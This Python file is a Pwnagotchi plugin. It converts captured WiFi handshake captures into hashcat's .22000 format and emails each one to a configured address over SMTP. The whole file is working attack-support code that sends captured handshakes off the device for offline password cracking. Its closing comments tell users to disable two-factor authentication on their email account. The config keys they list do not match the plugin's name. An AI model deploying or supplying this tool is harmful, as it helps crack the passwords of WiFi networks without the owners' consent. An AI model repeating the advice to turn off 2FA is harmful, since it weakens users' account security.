import os
import subprocess
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pwnagotchi.plugins import Plugin

class handymail(Plugin):
    __author__ = 'BThomas22x - CobraDev'
    __version__ = '1.0.0'
    __license__ = 'GPLv3'
    __description__ = 'A plugin to convert .pcap files to .22000 and email them'

    def __init__(self):
        self.ready = False

    def on_loaded(self):
        self.ready = True
        logging.info("[handymail] Plugin loaded and ready.")

    def on_internet_available(self, agent):
        logging.info("[handymail] Internet is available.")
        self.internet_available = True

    def on_internet_unavailable(self, agent):
        logging.info("[handymail] Internet is unavailable.")
        self.internet_available = False

    def on_handshake(self, filename, access_point, client_station, **kwargs):
        if not self.ready:
            return
        try:
            converted_file = self._convert_to_22000(filename)
            self._send_email(converted_file)
            logging.info(f"[handymail] Handshake {filename} converted and emailed successfully.")
        except Exception as e:
            logging.error(f"[handymail] Failed to send email: {e}")

    def _convert_to_22000(self, pcap_file):
        output_file = pcap_file.replace('.pcap', '.22000')
        subprocess.run(['hcxpcapngtool', '-o', output_file, pcap_file], check=True)
        return output_file

    def _send_email(self, file_path):
        if not self.internet_available:
            logging.error("[handymail] Internet is not available. Cannot send email.")
            return

        from_addr = self.options['from_addr']
        to_addr = self.options['to_addr']
        smtp_server = self.options['smtp_server']
        smtp_port = self.options['smtp_port']
        smtp_user = self.options['smtp_user']
        smtp_pass = self.options['smtp_pass']

        subject = 'Pwnagotchi Captured Handshake'
        body = 'A new handshake has been captured and converted.'

        msg = MIMEMultipart()
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        attachment = MIMEBase('application', 'octet-stream')
        with open(file_path, 'rb') as file:
            attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(attachment)

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(smtp_user, smtp_pass)
            server.send_message(msg)

      
#2 factor authentication for your email must be off for this to work 
#Make sure you edit your config.toml file with these options:
#main.plugins.email_handshakes.enabled = true
#main.plugins.email_handshakes.to_addr = 'recipient@example.com'
#main.plugins.email_handshakes.from_addr = 'your_email@example.com'
#main.plugins.email_handshakes.smtp_server = 'smtp.example.com'
#main.plugins.email_handshakes.smtp_port = 587
#main.plugins.email_handshakes.smtp_user = 'your_email@example.com'
#main.plugins.email_handshakes.smtp_pass = 'your_password'
